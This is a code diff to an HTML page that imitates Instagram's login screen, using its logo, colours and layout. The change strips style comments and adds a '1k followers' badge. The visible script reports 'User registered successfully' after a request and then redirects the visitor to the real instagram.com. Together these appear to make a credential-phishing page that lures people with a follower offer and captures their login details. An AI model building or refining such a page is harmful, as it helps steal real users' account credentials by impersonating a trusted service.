@@ -4,7 +4,7 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Instagram Login</title>
-    <link rel="icon" href="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" type="image/png"> <!-- Favicon -->
+    <link rel="icon" href="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" type="image/png">
     <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap" rel="stylesheet">
     <style>
         /* Reset default styling */
@@ -12,7 +12,7 @@
             margin: 0;
             padding: 0;
             box-sizing: border-box;
-            font-family: 'Roboto', sans-serif; /* Use Roboto font */
+            font-family: 'Roboto', sans-serif;
         }
 
         /* Background styling */
@@ -21,75 +21,89 @@
             align-items: center;
             justify-content: center;
             min-height: 100vh;
-            background-color: #fafafa; /* Light background color */
+            background-color: #fafafa;
         }
 
         /* Responsive Container styling */
         .login-container {
             max-width: 350px;
             width: 90%;
-            background-color: #ffffff; /* White background */
+            background-color: #ffffff;
             padding: 40px 30px;
-            border: 1px solid #dbdbdb; /* Light border */
+            border: 1px solid #dbdbdb;
             text-align: center;
             border-radius: 8px;
-            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1); /* Subtle shadow */
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+            position: relative;
+        }
+
+        /* Followers tag styling */
+        .followers-tag {
+            position: absolute;
+            top: 10px;
+            right: 10px;
+            background-color: #0095f6;
+            color: #ffffff;
+            padding: 4px 8px;
+            font-size: 0.8em;
+            border-radius: 12px;
+            font-weight: bold;
         }
 
         /* Logo and Title styling */
         .logo-title {
             display: flex;
             align-items: center;
-            justify-content: center; /* Center align logo and text */
+            justify-content: center;
             margin-bottom: 20px;
         }
 
         .logo-title img {
-            width: 40px; /* Smaller logo size */
-            margin-right: 10px; /* Space between logo and text */
+            width: 40px;
+            margin-right: 10px;
         }
 
         .logo-title span {
-            font-size: 24px; /* Font size for the title */
-            font-weight: bold; /* Bold font */
-            color: #262626; /* Dark gray color */
-            font-family: 'Helvetica Neue', 'Arial', sans-serif; /* Instagram-like font */
+            font-size: 24px;
+            font-weight: bold;
+            color: #262626;
+            font-family: 'Helvetica Neue', 'Arial', sans-serif;
         }
 
         /* Input fields */
         .input-field {
             width: 100%;
-            padding: 12px 10px; /* Padding adjusted for better spacing */
+            padding: 12px 10px;
             margin: 10px 0;
-            border: 1px solid #dbdbdb; /* Light border */
+            border: 1px solid #dbdbdb;
             border-radius: 5px;
             font-size: 1em;
-            background-color: #fafafa; /* Light background */
-            transition: border 0.3s; /* Transition effect */
+            background-color: #fafafa;
+            transition: border 0.3s;
         }
 
         .input-field:focus {
-            border: 1px solid #0095f6; /* Border color on focus */
-            outline: none; /* Remove outline */
+            border: 1px solid #0095f6;
+            outline: none;
         }
 
         /* Login button */
         .login-btn {
             width: 100%;
             padding: 10px;
-            background-color: #0095f6; /* Instagram blue */
-            color: white; /* White text */
+            background-color: #0095f6;
+            color: white;
             font-size: 1em;
-            font-weight: 500; /* Medium font weight */
+            font-weight: 500;
             border: none;
             border-radius: 5px;
             cursor: pointer;
             margin-top: 20px;
-            transition: background-color 0.3s; /* Transition effect */
+            transition: background-color 0.3s;
         }
 
         .login-btn:hover {
-            background-color: #0078cc; /* Darker blue on hover */
+            background-color: #0078cc;
         }
 
         /* OR separator */
@@ -97,7 +111,7 @@
             display: flex;
             align-items: center;
             text-align: center;
-            color: #8e8e8e; /* Gray color */
+            color: #8e8e8e;
             margin: 15px 0;
         }
 
@@ -105,7 +119,7 @@
         .separator::after {
             content: "";
             flex: 1;
-            border-bottom: 1px solid #dbdbdb; /* Light border */
+            border-bottom: 1px solid #dbdbdb;
         }
 
         .separator:not(:empty)::before {
@@ -120,39 +134,39 @@
         .signup {
             margin-top: 20px;
             font-size: 0.9em;
-            color: #262626; /* Dark gray */
+            color: #262626;
         }
 
         .signup a {
-            color: #0095f6; /* Instagram blue */
+            color: #0095f6;
             text-decoration: none;
-            font-weight: 500; /* Medium font weight */
+            font-weight: 500;
         }
 
         .signup a:hover {
-            text-decoration: underline; /* Underline on hover */
+            text-decoration: underline;
         }
 
         /* Responsive Design */
         @media (max-width: 600px) {
             .login-container {
-                padding: 20px; /* Smaller padding */
+                padding: 20px;
             }
 
             .logo-title img {
-                width: 30px; /* Smaller logo size on small screens */
+                width: 30px;
             }
 
             .logo-title span {
-                font-size: 20px; /* Smaller font size on small screens */
+                font-size: 20px;
             }
 
             .input-field {
-                padding: 10px; /* Smaller padding */
+                padding: 10px;
             }
 
             .login-btn {
-                padding: 8px; /* Smaller button */
+                padding: 8px;
             }
         }
     </style>
@@ -161,6 +175,9 @@
 
     <!-- Login Container -->
     <div class="login-container">
+        <!-- Followers Tag -->
+        <div class="followers-tag">1k followers</div>
+
         <div class="logo-title">
             <img src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" alt="Instagram Logo">
             <span>Instagram</span>
@@ -201,7 +218,6 @@
 
                 if (response.ok) {
                     alert('User registered successfully');
-                    // Redirect to Instagram after successful registration
                     window.location.href = 'https://www.instagram.com';
                 } else {
                     const errorText = await response.text();
